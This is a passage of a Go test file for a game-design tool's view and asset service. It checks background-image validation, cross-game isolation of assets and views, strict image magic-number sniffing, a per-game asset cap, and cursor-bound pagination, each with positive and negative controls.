			BackgroundInput{AssetID: &asset.ID, Scale: &value}),
			pointer("scale"), "greater than zero")
	}
	nan := math.NaN()
	assertRefusedErr(t, g.views.SetBackground(ctx, g.projectID, "world",
		BackgroundInput{AssetID: &asset.ID, Scale: &nan}),
		pointer("scale"), "finite")
	infinite := Point{X: math.Inf(1)}
	assertRefusedErr(t, g.views.SetBackground(ctx, g.projectID, "world",
		BackgroundInput{AssetID: &asset.ID, Offset: &infinite}),
		pointer("offset", "x"), "infinite")
	// The control: nothing above was stored.
	got, err := g.views.ViewByKey(ctx, g.projectID, "world")
	if err != nil {
		t.Fatalf("read back: %v", err)
	}
	if got.BackgroundAssetID != nil || got.BackgroundScale != DefaultBackgroundScale {
		t.Fatalf("a refused call stored something: %v, %v",
			got.BackgroundAssetID, got.BackgroundScale)
	}
}

// TestAnAssetOfAnotherGameCannotBecomeThisViewsBackground drives both
// mechanisms and both controls.
//
// The service lookup is what produces a sentence a caller can act on;
// 0008_views.sql's composite FOREIGN KEY (background_asset_id,
// project_id) is what actually guarantees it, and it is the only thing
// standing there — SetViewBackground's own WHERE clause cannot see the
// asset argument at all. So the statement is driven directly as well,
// the way Task 11 pinned its delete filters, because that is the only
// way to observe a constraint the service path has already made
// redundant.
func TestAnAssetOfAnotherGameCannotBecomeThisViewsBackground(t *testing.T) {
	azeroth, outland := newGame(t)
	ctx := context.Background()
	mine := azeroth.upload(t, "azeroth.png", pngBytes(t, 8, 8))
	theirs := outland.upload(t, "outland.png", pngBytes(t, 9, 9))

	in := saveable("world", questsOnly)
	in.Renderer = RendererMap
	view, err := azeroth.views.UpsertView(ctx, azeroth.projectID, in)
	if err != nil {
		t.Fatalf("save: %v", err)
	}

	// Through the service: a not_found naming the asset, because from
	// inside this game that id names nothing.
	err = azeroth.views.SetBackground(ctx, azeroth.projectID, "world",
		BackgroundInput{AssetID: &theirs.ID})
	if !errors.Is(err, ErrNotFound) {
		t.Fatalf("a foreign asset must be not_found, got %v", err)
	}
	// The positive control: this game's own asset is accepted, so the
	// refusal above is about the game and not about the call.
	if err := azeroth.views.SetBackground(ctx, azeroth.projectID, "world",
		BackgroundInput{AssetID: &mine.ID}); err != nil {
		t.Fatalf("this game's own asset must be accepted: %v", err)
	}

	// Through the statement, which is where the guarantee lives.
	q := dbq.New(azeroth.pool)
	_, err = q.SetViewBackground(ctx, dbq.SetViewBackgroundParams{
		ProjectID: azeroth.projectID, ID: view.ID,
		BackgroundAssetID: &theirs.ID, BackgroundScale: 1,
		BackgroundOffset: []byte(`{"x":0,"y":0}`),
	})
	var pgErr *pgconn.PgError
	if !errors.As(err, &pgErr) || pgErr.Code != "23503" {
		t.Fatalf("the composite foreign key must refuse another game's asset with "+
			"23503, got %v", err)
	}
	// And its control, so the assertion above cannot pass because the
	// statement refuses everything.
	if _, err := q.SetViewBackground(ctx, dbq.SetViewBackgroundParams{
		ProjectID: azeroth.projectID, ID: view.ID,
		BackgroundAssetID: &mine.ID, BackgroundScale: 1,
		BackgroundOffset: []byte(`{"x":0,"y":0}`),
	}); err != nil {
		t.Fatalf("the same statement must accept this game's own asset: %v", err)
	}
	// A view of another game, addressed by a leaked id: the project
	// filter is what refuses that, and execrows is what makes it a
	// refusal rather than a silent success.
	written, err := dbq.New(outland.pool).SetViewBackground(ctx, dbq.SetViewBackgroundParams{
		ProjectID: outland.projectID, ID: view.ID,
		BackgroundScale: 1, BackgroundOffset: []byte(`{"x":0,"y":0}`),
	})
	if err != nil || written != 0 {
		t.Fatalf("outland wrote %d rows of azeroth's view (err %v), want none",
			written, err)
	}
}

// TestDeletingAnAssetNullsTheBackgroundOfEveryViewUsingIt is the
// constraint's test, and it is written so the division of labour is
// legible: the null comes from 0008_views.sql's
// ON DELETE SET NULL (background_asset_id), the two defaults come from
// the statement RemoveAsset runs immediately before the delete, and
// neither does the other's job.
func TestDeletingAnAssetNullsTheBackgroundOfEveryViewUsingIt(t *testing.T) {
	g, _ := newGame(t)
	ctx := context.Background()
	doomed := g.upload(t, "azeroth.png", pngBytes(t, 8, 8))
	survivor := g.upload(t, "outland.png", pngBytes(t, 9, 9))

	g.backedView(t, "world", doomed.ID, 2.5, Point{X: 10, Y: -4})
	g.backedView(t, "routes", doomed.ID, 4, Point{X: 1, Y: 1})
	// The control: a third view backed by a *different* asset, which
	// must be untouched. Without it a delete that cleared every
	// background in the game would pass.
	g.backedView(t, "elsewhere", survivor.ID, 3, Point{X: 7, Y: 7})

	if err := g.views.RemoveAsset(ctx, g.projectID, doomed.ID); err != nil {
		t.Fatalf("remove: %v", err)
	}
	for _, key := range []string{"world", "routes"} {
		got, err := g.views.ViewByKey(ctx, g.projectID, key)
		if err != nil {
			t.Fatalf("%s must survive its background: %v", key, err)
		}
		if got.BackgroundAssetID != nil {
			t.Errorf("%s still points at %v: 0008_views.sql's ON DELETE SET NULL is "+
				"what detaches it", key, got.BackgroundAssetID)
		}
		if got.BackgroundScale != DefaultBackgroundScale ||
			string(got.BackgroundOffset) != `{"x": 0, "y": 0}` {
			t.Errorf("%s kept scale %v and offset %s, which now place an image that "+
				"is gone — the state SetBackground refuses to create",
				key, got.BackgroundScale, got.BackgroundOffset)
		}
	}
	other, err := g.views.ViewByKey(ctx, g.projectID, "elsewhere")
	if err != nil {
		t.Fatalf("read the control: %v", err)
	}
	if other.BackgroundAssetID == nil || *other.BackgroundAssetID != survivor.ID {
		t.Errorf("the control lost its background: %v", other.BackgroundAssetID)
	}
	if other.BackgroundScale != 3 {
		t.Errorf("the control's scale is %v, want 3 untouched", other.BackgroundScale)
	}
	// The asset itself is gone, and a second removal is not_found rather
	// than a success a caller could publish an event about.
	if _, err := g.views.ReadAsset(ctx, g.projectID, doomed.ID); !errors.Is(
		err, ErrNotFound) {
		t.Fatalf("the asset must be gone, got %v", err)
	}
	if err := g.views.RemoveAsset(ctx, g.projectID, doomed.ID); !errors.Is(
		err, ErrNotFound) {
		t.Fatalf("removing it twice must be not_found, got %v", err)
	}
}

// TestAnAssetOfAnotherGameCannotBeRemoved and its control.
func TestAnAssetOfAnotherGameCannotBeRemoved(t *testing.T) {
	azeroth, outland := newGame(t)
	ctx := context.Background()
	theirs := outland.upload(t, "outland.png", pngBytes(t, 9, 9))
	if err := azeroth.views.RemoveAsset(ctx, azeroth.projectID, theirs.ID); !errors.Is(
		err, ErrNotFound) {
		t.Fatalf("azeroth removed outland's asset: %v", err)
	}
	if _, err := outland.views.ReadAsset(ctx, outland.projectID, theirs.ID); err != nil {
		t.Fatalf("outland's asset must still be there: %v", err)
	}
	if err := outland.views.RemoveAsset(ctx, outland.projectID, theirs.ID); err != nil {
		t.Fatalf("outland must be able to remove its own: %v", err)
	}
}

// drawableBy and paramsFor are the least each renderer in the catalogue
// needs to be saveable at all, so that
// TestOnlyARendererThatDrawsABackgroundAcceptsOne is testing the
// background rule rather than the renderer requirements. A renderer
// added to the catalogue with requirements of its own lands here as a
// failing save, which is the loud half of that test's coverage.
func drawableBy(name string) string {
	switch name {
	case RendererLayered, RendererNested:
		// Both rank or nest by the edges between nodes.
		return questsToZones
	case RendererTimeline:
		// An axis has to be a declared field the saved query carries:
		// include_fields is a per-run option, so project.fields is the
		// only way a saved view can carry one.
		return `{"v":1,"from":[{"type":"quest","as":"q"}],
			"project":{"fields":["min_level"]}}`
	default:
		return questsOnly
	}
}

func paramsFor(name string) map[string]any {
	switch name {
	case RendererNested:
		return map[string]any{"contain_via": "takes_place_in"}
	case RendererTimeline:
		return map[string]any{"axis_field": "min_level"}
	default:
		return nil
	}
}

// createAsset is CreateAsset with the bytes in hand, returning only the
// error, for the tests that are about refusals.
// listedAssets is one unpaged page of a game's assets, for the tests
// that are about what is stored rather than about paging.
func listedAssets(t *testing.T, g *game) []Asset {
	t.Helper()
	page, err := g.views.ListAssets(context.Background(), g.projectID, AssetFilter{})
	if err != nil {
		t.Fatalf("list: %v", err)
	}
	return page.Assets
}

func createAsset(t *testing.T, g *game, filename string, raw []byte) error {
	t.Helper()
	_, err := g.views.CreateAsset(context.Background(), g.projectID, Actor{},
		filename, bytes.NewReader(raw))
	return err
}

// assertRefused requires err to be an invalid_input naming path and
// carrying want in its message.
func assertRefused(t *testing.T, err error, path, want string) {
	t.Helper()
	assertRefusedErr(t, err, path, want)
}

func assertRefusedErr(t *testing.T, err error, path, want string) {
	t.Helper()
	var ve *metamodel.ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("expected an invalid_input refusal at %s, got %v", path, err)
	}
	for _, f := range ve.Fields {
		if f.Path == path && strings.Contains(f.Message, want) {
			return
		}
	}
	t.Fatalf("expected a problem at %s containing %q, got %v",
		path, want, fmt.Sprint(ve.Fields))
}

// TestEveryByteOfEveryMagicNumberIsLoadBearing turns the WAV case above
// into the table it should have been.
//
// The WAV case pinned one byte of one magic number — the second half of
// RIFF/WEBP — and four mutations of exactly the same shape survived the
// whole package afterwards: the PNG signature cut from eight bytes to
// four, the JPEG one from three to two, the WebP VP8 start code check
// disabled, and svgLooking's xml-declaration arm dropped. Each is a
// widened allowlist, which is the one direction this file's whole
// defence is written against.
//
// **The VP8 one is not cosmetic.** With that check gone, a RIFF/WEBP
// container whose first chunk is `VP8 ` followed by ten arbitrary bytes
// yields dimensions inside every bound, and the garbage is *stored* as
// an image rather than refused — so the row that drives it asserts the
// refusal and the emptiness of the listing, not just the error.
//
// The shape of each row is "one byte short of legitimate": a file
// carrying the prefix of a magic number and then plausible bytes. A
// sniffer that compares fewer bytes than the format declares accepts
// every one of them.
func TestEveryByteOfEveryMagicNumberIsLoadBearing(t *testing.T) {
	g, _ := newGame(t)

	// A real PNG's first four bytes, then a body that is not one. Under
	// an eight-byte comparison this is refused as no image at all; under
	// a four-byte one it is sniffed as image/png and hits the decoder.
	shortPNG := append([]byte{0x89, 'P', 'N', 'G'}, []byte("not really a png at all")...)
	// SOI and nothing else: the third byte of magicJPEG is what tells a
	// JPEG from an arbitrary file that happens to begin 0xFF 0xD8.
	shortJPEG := append([]byte{0xff, 0xd8}, []byte("\x00\x00 arbitrary bytes")...)
	// A VP8 chunk whose three-byte start code is wrong. Everything else
	// about it is well formed, and the two 14-bit dimensions it carries
	// are perfectly in bounds — which is the whole point: the start code
	// is the only thing that says these bytes are a frame header.
	badStartCode := webpVP8(64, 48)
	badStartCode[23] = 0x00 // body[3], the first byte of the start code.

	for _, tc := range []struct {
		name string
		raw  []byte
		want string
	}{
		{"a PNG signature cut short", shortPNG, "are not a image/png"},
		{"a JPEG signature cut short", shortJPEG, "are not a image/png"},
		{"a RIFF that is not a WEBP", func() []byte {
			wave := append([]byte("RIFF"), 0, 0, 0, 0)
			wave = append(wave, "WAVEfmt "...)
			return append(wave, make([]byte, 16)...)
		}(), "are not a image/png"},
		{"a VP8 frame with a wrong start code", badStartCode,
			"carries no start code"},
		{"an XML declaration with no <svg in the first bytes", []byte(
			"<?xml version=\"1.0\"?>\n<!-- a comment long enough to push the element " +
				"past anything a prefix check would see -->\n"), "look like an SVG"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			assertRefused(t, createAsset(t, g, "map.png", tc.raw), pointer("bytes"), tc.want)
		})
	}

	// The control every row shares: not one of them was stored. Without
	// it the VP8 row would pass on the refusal alone while a widened
	// check quietly wrote garbage into view_assets.
	assets := listedAssets(t, g)
	if len(assets) != 0 {
		t.Fatalf("%d assets stored, want none: %v", len(assets), assets)
	}

	// The positive controls, in the same test, so that no row above can
	// be passing because uploads are broken: the full-length magic
	// number of each format is accepted.
	for _, ok := range [][]byte{pngBytes(t, 8, 8), jpegBytes(t, 16, 16),
		webpVP8(64, 48), webpVP8X(24, 12), webpVP8L(30, 10)} {
		if err := createAsset(t, g, "map.png", ok); err != nil {
			t.Fatalf("a well-formed image must still be accepted: %v", err)
		}
	}
}

// TestChangingTheRendererAwayFromMapIsRefusedWhileABackgroundIsAttached
// closes the half of Task 14's own rule that reached only one of the two
// writers of background_asset_id.
//
// SetBackground refuses a background under a renderer that draws none —
// the image would be stored and read by nothing — and its refusal used
// to say "change the renderer through views.upsert", naming the call
// that produced exactly the state it was refusing: UpsertView never
// consulted Renderer.ReadsBackground, so save with `map`, set a
// background, upsert with `graph`, and the row carried an image under a
// renderer that draws none, with the scale and the offset still set.
//
// The refusal rather than a silent clear is the same call every write in
// this package makes: a designer's placed world map is not an agent's to
// discard while editing a query, and the repair is one named call.
func TestChangingTheRendererAwayFromMapIsRefusedWhileABackgroundIsAttached(t *testing.T) {
	g, _ := newGame(t)
	ctx := context.Background()
	asset := g.upload(t, "azeroth.png", pngBytes(t, 37, 19))
	g.backedView(t, "world", asset.ID, 3, Point{X: 10, Y: -4})

	away := saveable("world", questsOnly)
	away.Renderer = RendererGraph
	away.ExpectedVersion = ptrInt32(1)
	_, err := g.views.UpsertView(ctx, g.projectID, away)
	assertRefused(t, err, pointer("renderer"), "draws no background")

	// Nothing moved: the refusal is a refusal and not a partial write.
	got, err := g.views.ViewByKey(ctx, g.projectID, "world")
	if err != nil {
		t.Fatalf("read back: %v", err)
	}
	if got.Renderer != RendererMap || got.BackgroundAssetID == nil {
		t.Fatalf("view = (%s, %v), want the map renderer and its background intact",
			got.Renderer, got.BackgroundAssetID)
	}

	// The repair the message names, in order: clear the background, then
	// change the renderer. Both halves are asserted, because a refusal
	// whose stated recovery does not work is worse than no message.
	if err := g.views.SetBackground(ctx, g.projectID, "world", BackgroundInput{}); err != nil {
		t.Fatalf("clearing a background must be legal: %v", err)
	}
	if _, err := g.views.UpsertView(ctx, g.projectID, away); err != nil {
		t.Fatalf("after clearing the background the renderer change must land: %v", err)
	}

	// And the other direction is untouched: an edit that keeps a
	// background-drawing renderer is an ordinary edit. The positive
	// control that stops the check above from refusing every upsert of a
	// view that has an image.
	g.backedView(t, "atlas", asset.ID, 1, Point{})
	stay := saveable("atlas", questsOnly)
	stay.Renderer = RendererMap
	stay.Name = "The atlas"
	stay.ExpectedVersion = ptrInt32(1)
	if _, err := g.views.UpsertView(ctx, g.projectID, stay); err != nil {
		t.Fatalf("an edit that keeps the map renderer must land: %v", err)
	}
}

// TestAGameCannotHoldMoreAssetsThanTheCap is the bound that was missing
// while every other bound in this file was present.
//
// Eight megabytes an asset and forty megapixels a canvas, and nothing at
// all on how many: twelve uploads under one filename all landed, and so
// would twelve thousand. Any editor — a designer, or an agent's token,
// and one token is one game — could push unbounded bytes into Postgres
// eight megabytes at a time.
//
// The refusal names the count and the cap, because "delete one first" is
// the only recovery and a caller has to know how many it is holding.
func TestAGameCannotHoldMoreAssetsThanTheCap(t *testing.T) {
	azeroth, outland := newGame(t)
	ctx := context.Background()

	// The cap is a hundred, so this fills it through the pool rather
	// than through a hundred image encodings.
	filler := pngBytes(t, 8, 8)
	for i := 0; i < MaxAssetsPerGame; i++ {
		if _, err := azeroth.pool.Exec(ctx,
			`INSERT INTO view_assets (project_id, filename, mime, width, height, bytes)
			 VALUES ($1, $2, 'image/png', 8, 8, $3)`,
			azeroth.projectID, fmt.Sprintf("map-%03d.png", i), filler); err != nil {
			t.Fatalf("seed asset %d: %v", i, err)
		}
	}
	assertRefused(t, createAsset(t, azeroth, "one-too-many.png", filler),
		pointer("bytes"), fmt.Sprintf("a game may hold %d", MaxAssetsPerGame))

	// The cap is per game and not per instance: the other game is
	// untouched, which is the control that stops a global counter from
	// passing this test.
	if err := createAsset(t, outland, "outland.png", filler); err != nil {
		t.Fatalf("another game must still be able to upload: %v", err)
	}

	// And the recovery the message names works: delete one, upload one.
	page, err := azeroth.views.ListAssets(ctx, azeroth.projectID, AssetFilter{Limit: 1})
	if err != nil {
		t.Fatalf("list: %v", err)
	}
	if err := azeroth.views.RemoveAsset(ctx, azeroth.projectID, page.Assets[0].ID); err != nil {
		t.Fatalf("remove: %v", err)
	}
	if err := createAsset(t, azeroth, "room-for-one-more.png", filler); err != nil {
		t.Fatalf("after a deletion the upload must land: %v", err)
	}
}

// TestTheAssetListingIsPagedAndItsCursorIsItsOwn pins the limit and the
// keyset the listing did not have.
//
// It answered with every asset a game held — the whole library in one
// call — while view_assets_project_idx's own comment said its order
// existed "so a page can be sought to rather than read whole and
// sorted". The rows are asserted in order and without repetition,
// because a keyset whose comparison disagrees with its sort order skips
// or repeats at a page boundary and says nothing about it.
func TestTheAssetListingIsPagedAndItsCursorIsItsOwn(t *testing.T) {
	azeroth, outland := newGame(t)
	ctx := context.Background()

	// Seven assets, uploaded in one burst so several share a created_at
	// to the microsecond: the id tiebreak in the keyset is what keeps
	// those rows apart, and a fixture whose timestamps are all distinct
	// cannot tell whether it is there.
	want := make([]uuid.UUID, 0, 7)
	for i := 0; i < 7; i++ {
		want = append(want, azeroth.upload(t, fmt.Sprintf("map-%d.png", i),
			pngBytes(t, 8+i, 8)).ID)
	}

	var got []uuid.UUID
	filter := AssetFilter{Limit: 3}
	for pages := 0; ; pages++ {
		if pages > 5 {
			t.Fatal("the listing did not terminate: a cursor is not advancing")
		}
		page, err := azeroth.views.ListAssets(ctx, azeroth.projectID, filter)
		if err != nil {
			t.Fatalf("page %d: %v", pages, err)
		}
		if len(page.Assets) > 3 {
			t.Fatalf("page %d carried %d assets, want the limit of 3 to be applied",
				pages, len(page.Assets))
		}
		for _, a := range page.Assets {
			got = append(got, a.ID)
		}
		if page.NextCursor == "" {
			break
		}
		filter.Cursor = page.NextCursor
	}
	if len(got) != len(want) {
		t.Fatalf("paging returned %d assets, want %d: %v", len(got), len(want), got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("asset %d of the walk is %s, want %s: the page boundary skipped or "+
				"repeated a row", i, got[i], want[i])
		}
	}

	// A cursor belongs to the game it was issued for. The other game's
	// listing must refuse it rather than page its own rows from a
	// position that means nothing there — the defect internal/paging's
	// package comment records.
	first, err := azeroth.views.ListAssets(ctx, azeroth.projectID, AssetFilter{Limit: 3})
	if err != nil {
		t.Fatalf("first page: %v", err)
	}
	_, err = outland.views.ListAssets(ctx, outland.projectID,
		AssetFilter{Cursor: first.NextCursor})
	assertRefused(t, err, pointer("cursor"), "cursor")

	// And a cursor from the *view* listing of the same game is refused
	// too: without a domain part in the fingerprint the two would be
	// interchangeable and each would page the other perfectly.
	if _, err := azeroth.views.UpsertView(ctx, azeroth.projectID,
		saveable("route", questsOnly)); err != nil {
		t.Fatalf("save a view: %v", err)
	}
	views, err := azeroth.views.ListViews(ctx, azeroth.projectID, ViewFilter{Limit: 1})
	if err != nil {
		t.Fatalf("list views: %v", err)
	}
	if views.NextCursor == "" {
		t.Fatal("the view listing returned no cursor, so this half asserts nothing")
	}
	_, err = azeroth.views.ListAssets(ctx, azeroth.projectID,
		AssetFilter{Cursor: views.NextCursor})
	assertRefused(t, err, pointer("cursor"), "cursor")
}
